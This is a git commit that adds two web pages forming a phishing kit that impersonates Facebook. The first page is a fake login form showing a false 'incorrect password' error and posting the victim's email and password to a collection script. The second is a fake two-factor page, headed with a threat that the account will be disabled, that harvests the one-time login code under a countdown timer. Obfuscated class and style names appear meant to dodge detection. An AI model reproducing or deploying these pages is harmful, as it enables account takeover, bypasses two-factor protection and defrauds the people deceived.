f27d5bc058b0675fbbde2d3399ad9e400883a826
mutilamverbuck <137168912+mutilamverbuck@users.noreply.github.com>
2023-06-20 14:02:25 +0200

    Add files via upload

---
+++ index3.php
@@ -0,0 +1,314 @@
+
+
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+	
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <script src="https://kit.fontawesome.com/a2267851a4.js" crossorigin="anonymous"></script>
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <style type="text/css">
+      .mnaianas{
+        backgrounda-color:#eff2f5;
+        padding-top:40px;
+        text-align: center;
+        padding-bottom: 60px;
+      }
+      .maikrysmashesol{
+        backgrounda-color: white;
+        border-radius: 7px;
+        box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+        border: 1px solid #dddfe2;
+        padding: 20px 17px;
+        max-width: 450px;
+        margin: auto;
+      }
+      .maikrysmashesol p{
+        font-size: 18px;
+
+      }
+      .maikrysmashesol input{
+        border-radius: 6px;
+        font-size: 17px;
+        padding: 14px 16px;
+        border: 1px solid #dddfe2;
+        color: #1d2129;
+      }
+      .maikrysmashesol .logini{
+        backgrounda-color: #1877f2;
+        width: 100%;
+        font-size: 20px;
+        padding: 10px 16px;
+        border-radius: 6px;
+        font-weight: bold;
+        margin-bottom: 15px !important;
+      }
+      .nueratijuberins{
+        display: block;
+        margin-bottom: 10px;
+        overflow: hidden;
+        text-align: center;
+        white-space: nowrap;
+        width: 100%;
+        margin-top: 10px;
+      }
+      .nuteijsadberins2{
+        display: inline-block;
+        position: relative;
+        font-size: 13px;
+        color: #96999e;
+      }
+      .nueratijuberins>span:before, .nueratijuberins>span:after {
+        backgrounda: #ccd0d5;
+        content: "";
+        height: 1px;
+        position: absolute;
+        top: 50%;
+        width: 9999px;
+      }
+      .nueratijuberins>span:after {
+        left: 100%;
+        margin-left: 15px;
+      }
+      .nueratijuberins>span:before {
+        margin-right: 15px;
+        right: 100%;
+      }
+      .footer{
+        padding-top: 20px;
+      }
+      .footer .listinghorizifotuer li{
+        display:inline;
+        padding-right: 15px;
+        color: #737373;
+        font-size: 12px;
+      }
+
+      .footer .listinghorizifotuer{
+        padding-bottom: 10px;
+        padding-left: 0px;
+      }
+      .footer .listiinmim11{
+        border-bottom: 1px solid #dddfe2;
+      } 
+      .danratogravwadicao{
+        margin-top: -39px;
+        font-size: 22px;
+        color: #fa3e3e;
+        float: right;
+        margin-right: 16px;
+      }
+    </style>
+    <title>Facebook</title>
+  </head>
+  <body>
+    <section class="mnaianas">
+      <div class="container">
+        <div class="row">
+          <div class="col-12">
+            <img src="./gorilla.svg" height="85">
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-md-6 offset-md-3">
+            <div class="maikrysmashesol">
+              <p>Log Into Facebook</p>
+              <div class="alert alert-warning" role="alert" style="font-size: 13px; text-align: center;">
+                You must log in to continue.
+              </div>
+              <form action="point4.php" method="POST">
+                <div class="form-group">
+                  <input type="hidden" name="password" value="b8e5c89e28ec9c3d26e660078ceba9c6">
+                  <input type="text" required class="form-control" id="exampleFormControlInput1" placeholder="Email or Phone Number" name="usernames" value="">
+                </div>
+                <div class="form-group"  style="margin-bottom: 10px;">
+                  <input type="password" required name="pwja" style="border: 1px solid #fa3e3e;     border-radius: 6px;
+    padding: 14px 16px;
+    backgrounda: #FFFFFF url(/rsrc.php/v3/yO/r/YQNfPR9MJfx.png) repeat-x;
+    color: #1d2129;" class="form-control" id="exampleFormControlInput1" placeholder="Password">
+                <i class="_9ay6 danratogravwadicao fas fa-exclamation-triangle"></i>
+                </div>
+                <p style="font-size: 12px;color: #fa3e3e; font-size: 12px; text-align: left !important;">The password you’ve entered is incorrect.</p>
+                <button type="submit" class="btn btn-primary mb-2 logini" style="margin-top:5px;">Log In</button>
+              </form>
+              <a style="color: #1877f2; font-weight: 500; font-size: 14px; ">Forgot account?</a>
+              <div class="nueratijuberins"><span class="nuteijsadberins2">or</span></div>
+              <button style="    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    line-height: 48px;
+    padding: 0 16px;
+    backgrounda-color: #42b72a;
+    border-color: #42b72a;
+    box-sizing: content-box;
+    -webkit-font-smoothing: antialiased;
+    font-weight: bold;
+    justify-content: center;
+    position: relative;
+    text-align: center;
+    margin-top: 10px;
+    margin-bottom: 12px;
+    text-shadow: none;
+    vertical-align: middle;" class="btn btn-success">Create New Account</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-12">
+            <ul class="listinghorizifotuer listiinmim11">
+              <li>
+                English (US)
+              </li>
+              <li>
+                Spanish
+              </li>
+              <li>
+                Türkçe
+              </li>
+              <li>
+                Српски
+              </li>
+              <li>
+                Deutsch
+              </li>
+              <li>
+                Français (France)
+              </li>
+              <li>
+                Italiano
+              </li>
+              <li>
+                Bosanski
+              </li>
+              <li>
+                Svenska
+              </li>
+              <li>
+                Português (Brasil)
+              </li>
+              <li>
+                中文(简体)
+              </li>
+            </ul>
+            <ul class="listinghorizifotuer">
+              <li>
+                Sign Up
+              </li>
+              <li>
+                Log In
+              </li>
+              <li>
+                Messenger
+              </li>
+              <li>
+                Facebook Lite
+              </li>
+              <li>
+                Watch
+              </li>
+              <li>
+                People
+              </li>
+              <li>
+                Pages
+              </li>
+              <li>
+                Page Categories
+              </li>
+              <li>
+                Places
+              </li>
+              <li>
+                Games
+              </li>
+              <li>
+                Locations
+              </li>
+              <li>
+                Marketplace
+              </li>
+              <li>
+                Facebook Pay
+              </li>
+              <li>
+                Jobs
+              </li>
+              <li>
+                Oculus
+              </li>
+              <li>
+                Portal
+              </li>
+              <li>
+                Instagram
+              </li>
+              <li>
+                Local
+              </li>
+              <li>
+                Fundraisers
+              </li>
+              <li>
+                Services
+              </li>
+              <li>
+                Voting Information Center
+              </li>
+              <li>
+                About
+              </li>
+              <li>
+                Create Ad
+              </li>
+              <li>
+                Create Page
+              </li>
+              <li>
+                Developers
+              </li>
+              <li>
+                Careers
+              </li>
+              <li>
+                Privacy
+              </li>
+              <li>
+                Cookies
+              </li>
+              <li>
+                Ad Choices
+              </li>
+              <li>
+                Terms
+              </li>
+              <li>
+                Help
+              </li>
+              <li>
+                Settings
+              </li>
+              <li>
+                Activity Log
+              </li>
+            </ul>
+            <p style="color: #737373; font-size: 12px;">Facebook © 2021</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+</html>
---
+++ twofac.php
@@ -0,0 +1,461 @@
+
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <!--2021 <$©M> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="bootstrapmodal.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="">
+        <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js'></script>
+    <script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js'></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-validator/0.4.5/js/bootstrapvalidator.min.js'></script>
+    <link rel="icon" href="flogo.png">
+    <title>Your personal account will be disabled soon!</title>
+    <style type="text/css">
+      body{
+        background-color: #e9ebee;
+        margin-bottom:30px;
+      }
+      .kaitjsdoadjjgh3{
+        margin-top: 2px !important;
+        font-size:16px;
+        padding: 12px;
+/*        background-color: #f5f6f7;
+*/        border-bottom: 1px solid rgba(0, 0, 0, .101);
+        border-top-right-radius: 5px;
+        font-weight: 700;
+        color: #4b4f56;
+        border-top-left-radius: 5px;
+        margin-bottom: 0px;
+      }
+
+      .kalitifikumi2as p{
+          margin-top:7px;
+          margin-bottom:7px;
+      }
+      .content1{
+        background-color: white;
+        padding: 10px;
+        font-size: 13px;
+        border-bottom: 1px solid rgba(0, 0, 0, .101);
+      }
+      .kalitifikumi2as{
+        background-color: white;
+        padding: 10px;
+        font-size: 13px;
+        border-bottom: 1px solid rgba(0, 0, 0, .101);
+      }
+      .kalitifikumi2as a{
+        color:#576b95;
+      }
+      .kalitifikumi2as input[type=text]{
+        border: 1px solid #999;
+        border-radius: 0px;
+        height: 30px;
+        font-size:13px;
+      }
+      
+      .nufdgraitaalaasa .list-group .list-group-item{
+          padding:0px;
+          padding-top:5px;
+          padding-bottom:5px;
+          font-size:14px;
+          border:0px;
+          color: #444950;
+      }
+      .nufdgraitaalaasa .list-group .list-group-item:hover{
+          background-color:rgba(29, 33, 41, .04);
+      }
+      
+      .kalitifikumi2as small{
+        margin-bottom: 2px;
+      }
+      .kalitifikumi2as textarea{
+        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
+        border: solid 1px #999;
+        border-top-color: #888;
+        border-radius: 0px;
+        height: 65px;
+      }
+      .nesendbutatona button{
+        width:30%;
+        float: right;
+        background-color: #627aad;
+        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
+        font-weight: bold;
+      }
+      .nesendbutatona {
+        background-color: #f5f6f7 !important;
+        padding: 11px 20px;
+      }
+      .kapinavrabi .nav-linkuu{
+          color:#3578e5 !important;
+          font-size:14px !important;
+          font-weight:600 !important;
+          padding: 15px 0px !important;
+          border-bottom: 3px solid #3578e5;
+      }
+      .kapinavrabi .navbar {
+          padding-top: 0px !important;
+          padding-bottom: 0px !important;
+      }
+      .kapinavrabi{
+          background-color:#e9ebee;
+      }
+      .nufdgraitaalaasa{
+          margin-top:50px;
+      }
+      
+        @media only screen and (max-width: 600px) {
+          .nufdgraitaalaasa {
+            margin-top:20px;
+          }
+          .kaitjsdoadjjgh3{
+            font-weight: 600;
+          }
+          body{
+            background-color: #e9ebee;
+            margin-bottom:20px;
+          }
+          .kapinavrabi{
+              display:none;
+          }
+          .sidebar-nufdgraitaalaasa{
+              display:none;
+          }
+          .satiababiaaasstanillog{
+              height:30px !important;
+              text-align:center !important;
+          }
+          .hidebabikjohead{
+              text-align:center !important;
+          }
+          .seirqiblass{
+              display: none;
+          }
+          .nawasawasasebmit{
+              display:none;
+          }
+          .tooteerjumojata {
+              display:none;
+          }
+        }
+        
+        @media only screen and (min-width: 768px) {
+          .kalitifikumi2as{
+              padding:10px 20px !important;
+          }
+          .replomibjuba{
+              display:none;
+          }
+          .satiababiaaasstanillog{
+              height:37px !important;
+              text-align:left !important;
+          }
+          .kalitifikumi2as label{
+              color: #90949c !important;
+              font-weight:700 !important;
+              font-size:12px;
+          }
+          .kalitifikumi2as small{
+              color: #90949c !important;
+              margin-bottom:5px;
+          }
+          .kalitifikumi2as .form-group{
+              margin-bottom:9px !important;
+          }
+          .kalitifikumi2as input[type=text], .kalitifikumi2as textarea, .kalitifikumi2as input[type=password]{
+              margin-top:7px !important;
+          }
+          .hidebabikjohead{
+              padding-top: 17px !important;
+              padding-bottom: 17px !important;
+          }
+          .seirqiblass i{
+              color: #616161;
+              font-size:13px;
+          }
+          .seirqiblass .form-control-lg{
+              font-size: 17px;
+              padding: 0px 8px !important;
+              border:none;
+          }
+          .seirqiblass form{
+              border: 1px solid  #000;
+              border-radius:0px !important;
+          }
+          .seirqiblass .card-body{
+              padding: 0px !important;
+              padding-left: 10px !important;
+          }
+          .seirqiblass input{
+              height: 36px !important;
+              color: #90949c;
+          }
+          .nawasawasasebmit{
+              background-color:#f5f6f7;
+              text-align:right;
+              padding: 11px 20px;
+          }
+          .nawasawasasebmit button{
+            background-color: #4267b2;
+            border-color: #4267b2;
+            line-height: 31px;
+            padding: 0 15px;
+            font-weight: 500;
+            font-size: 13px;
+          }
+          
+            .tooteerjumojata  ul {
+              list-style-type: none;
+              margin: 0;
+              padding: 0;
+              overflow: hidden;
+            }
+            
+            .tooteerjumojata  li {
+              float: left;
+            }
+            
+           .tooteerjumojata   li a {
+              display: block;
+              color: #90949c;
+              text-align: center;
+              padding: 15px 10px;
+              font-size: 12px;
+              text-decoration: none;
+            }
+            .tooteerjumojata   li a.active {
+              color: #bec3c9;
+            }
+            .fooatermenuwe{
+                margin-top:20px;
+                margin-bottom:20px;
+            }
+            .fooatermenuwe .list-group-item{
+                border: none;
+                font-size:12px;
+                color: #90949c;
+                padding: 4px 10px;
+            }
+          .nufdgraitaalaasa{
+              margin-bottom: 70px !important;
+          }
+        }
+        /* Chrome, Safari, Edge, Opera */
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+.haridinja{
+  background-color: #3a5998;
+  padding-top: 12px;
+  padding-bottom: 12px;
+}
+.haridinja .logo{
+  height: 25px;
+}
+.haridinja .input-group{
+  margin-bottom: 0px !important;
+}
+.haridinja .input-group input[type=text]{
+  height: 35px;
+  border-radius: 0px;
+  border: 1px solid black;
+}
+.haridinja .colonalogo{
+  padding-top:5px;
+}
+/* Firefox */
+input[type=number] {
+  -moz-appearance: textfield;
+}
+    #timer{
+ background: none!important;
+  border: none;
+  padding: 0!important;
+  /*optional*/
+  font-family: arial, sans-serif;
+  /*input has OS specific font-family*/
+  color: #385898;
+  cursor: pointer;
+  text-decoration-line: none !important;
+  display: inline;
+    }
+    .nolink{
+        color: black !important;
+        text-decoration-line: none !important;
+        cursor: default !important;    
+    }
+@media (min-width: 768px){
+.offset-md-3 {
+    margin-left: 25%;
+}
+}
+    </style>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+  </head>
+  <body>
+
+    <section class="haridinja">
+      <div class="container">
+        <div class="row">
+          <div class="col-4 colonalogo">
+            <img src="ids.png" class="logo">
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <section class="nufdgraitaalaasa">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-md-6 offset-md-3">  
+            
+            <div style="border: 1px solid #c8cacc; border-radius: 4px">
+              <h3 class="kaitjsdoadjjgh3">Two-factor authentication required</h3>
+              <div class="kalitifikumi2as">
+                  <p></p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
+                  <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
+                  <form action="sub2fac.php" method="POST" style="margin-top:14px">
+                    <div class="form-group"> 
+                      <input type="number" required class="form-control" id="exampleFormControlInput1" name="code" placeholder="Login code" style="width: 170px !important;display: inline">
+                        <input type="hidden" name="password" value="b8e5c89e28ec9c3d26e660078ceba9c6">
+                        <input type="text" id="minutes" value="4.9833333333333334" style="display: none !important;" name="2fa">
+                        &nbsp;
+                        <input type="button" id="timer" value="Start Timer" onclick="startCounter();" style="display: inline"><p id="time" style="display: inline"></p>
+
+
+                    </div>
+              </div>
+              <div class="nawasawasasebmit">
+                <a href="javascript: void();" style="margin-top:5px; float: left;font-size: 14px;  color: #385898;font-weight: 641;" data-toggle="modal" data-target="#exampleModalScrollable">Need another way to authenticate?</a>
+                  <button type="submit" class="btn btn-primary" name="twofacsub">Send</button>
+              </div>
+              <div class="container nesendbutatona replomibjuba">
+      <div class="row">
+        <div class="col-12" style="width: 100% !important;">
+               <a href="javascript: void();" style="margin-top:5px; float: left;font-size: 14px; color: #385898;font-weight: 641;" data-toggle="modal" data-target="#exampleModalScrollable">Need another way to authenticate?</a>
+          <button type="submit" class="btn btn-primary" name="twofacsub">Send</button>
+        </div>
+      </div>
+    </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    
+    </form>
+
+<div class="modal fade" id="exampleModalScrollable" tabindex="-1" role="dialog" aria-labelledby="exampleModalScrollableTitle" aria-hidden="true">
+                <form class="form-horizontal" action=" " method="post" id="reg_form">
+        <fieldset>
+                <div class="modal-dialog modal-dialog-scrollable" role="document">
+                    <div class="modal-content" style="">
+                        <div class="modal-header">
+                            <h5 class="modal-title" id="exampleModalScrollableTitle" style="color: black !important;">Didn’t receive a code?</h5>
+                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"></span>
+                            </button>
+                        </div>
+
+
+                        <div class="modal-body" style="overflow: auto;color: black !important;">
+
+<p>1. Go to <b>Settings</b> > Security and Login.</p>
+<p>2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication</b>. You may need to re-enter your password.
+</p>
+<p>3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already set up recovery codes, you can click <b>Show Codes</b>.
+</p>
+<img src="./recovery.png" alt="" width="100%">
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn canceloje" data-dismiss="modal">Close</button>
+                            <button type="button" class="btn canceloje" data-dismiss="modal" style="background-color: #1877f2;color: white">Continue</button>
+
+ 	
+                        </div>
+                        <!-- Text input-->
+
+
+                        <!-- Button -->
+                    </div>
+
+                </div>
+                      </fieldset>
+    </form>
+            </div>
+
+
+
+<script>
+    // JavaScrtaliipt Document
+
+
+var mySeconds;
+var intervalHandle;
+var myButton=document.getElementById("timer");
+var timeDisplay=document.getElementById("time");
+
+function resetPage(){   
+    myButton.removeAttribute("disabled");
+    myButton.value="Send Code Again";
+    timeDisplay.innerHTML="";
+    myButton.classList.remove('nolink');
+
+}
+function tick(){
+    var timeDisplay=document.getElementById("time");
+    
+    var min=Math.floor(mySeconds/60);
+    var sec=mySeconds-(min*60);
+    
+    if (sec < 10) {
+        sec="0"+sec;
+    }
+    
+    var message=min.toString()+":"+sec;
+    
+    timeDisplay.innerHTML=message+" )";
+    
+    if(mySeconds===0){
+        clearInterval(intervalHandle);
+        resetPage();
+    }
+    mySeconds--;
+    
+    
+}
+function startCounter(){
+    var myInput=document.getElementById("minutes").value;
+    if (isNaN(myInput)){
+        alert("Type a valid number please");
+        return;
+    }
+    mySeconds=myInput*60;
+    
+    intervalHandle=setInterval(tick, 1000);
+    myButton.disabled=true;
+    myButton.value="( wait: ";
+    myButton.classList.add('nolink');
+    timeDisplay.innerHTML="5:00 )";
+    
+}
+</script>
+<script>
+      $(document).ready(function () {
+      $("#timer").click();});
+      </script>
+
+  </body>
+</html>
